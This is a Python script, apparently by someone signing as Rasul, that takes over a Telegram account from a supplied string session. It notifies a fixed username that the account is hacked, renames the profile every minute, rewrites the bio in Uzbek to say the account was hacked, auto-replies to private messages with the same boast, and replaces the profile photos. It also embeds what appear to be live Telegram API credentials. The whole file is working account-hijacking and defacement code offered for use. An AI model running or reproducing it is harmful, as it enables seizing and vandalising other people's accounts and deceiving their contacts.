import os
import time
print("\033[1;32mD")
time.sleep(.1)
os.system("clear")
print("Da")
time.sleep(.1)
os.system("clear")
print("Das")
time.sleep(.1)
os.system("clear")
print("Dast")
time.sleep(.1)
os.system("clear")
print("Dastu")
time.sleep(.1)
os.system("clear")
print("Dastur")
time.sleep(.1)
os.system("clear")
print("Dasturc")
time.sleep(.1)
os.system("clear")
print("Dasturch")
time.sleep(.1)
os.system("clear")
print("Dasturchi")
time.sleep(.1)
os.system("clear")
print("Dasturchi \033[1;31mR")
time.sleep(.1)
os.system("clear")
print("\033[1;32mDasturchi \033[1;31mRa")
time.sleep(.1)
os.system("clear")
print("\033[1;32mDasturchi \033[1;31mRas")
time.sleep(.1)
os.system("clear")
print("\033[1;32mDasturchi \033[1;31mRasu")
time.sleep(.1)
os.system("clear")
print("\033[1;32mDasturchi \033[1;31mRasul")
time.sleep(1.3)
os.system("clear")
import aiocron
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.sessions import StringSession
from telethon.sync import TelegramClient
import time



api_id = 23871583
api_hash ="f5fb6f07eed86a2da3b08f830f6d3a9e"
string =  input("String session >> ")

client = TelegramClient(StringSession(string), api_id, api_hash)
client.start()
#modules
client.send_message("@X0X0X0X0X0X0XX0X0X0X0X0X0X", "Account Hacked By Rasul☠️")
@aiocron.crontab("*/1 * * * *")
async def set_clock():
    async with client:
        await client(UpdateProfileRequest(first_name="elegram", last_name="", about='Ushbu Hisob Rasul Tomnidan Buzib Kirildi!!!☠️💀'))

@client.on(events.NewMessage(incoming=True))
async def handle_new_message(event):
    if event.is_private:  # only auto-reply to private chats
        from_ = await event.client.get_entity(event.from_id)
        if not from_.bot:
            await event.respond("Ushbu Hisob💻 Rasul  😈 Tomonidan Buzib Kirildi!!!☠️💀\nI'm Realy Sorry Bro!!!🥹😅")

client(DeletePhotosRequest(client.get_profile_photos('me')))
result = client(UploadProfilePhotoRequest(file=client.upload_file('photo.jpg')))

client.loop.run_forever()
client.run_until_disconnected()
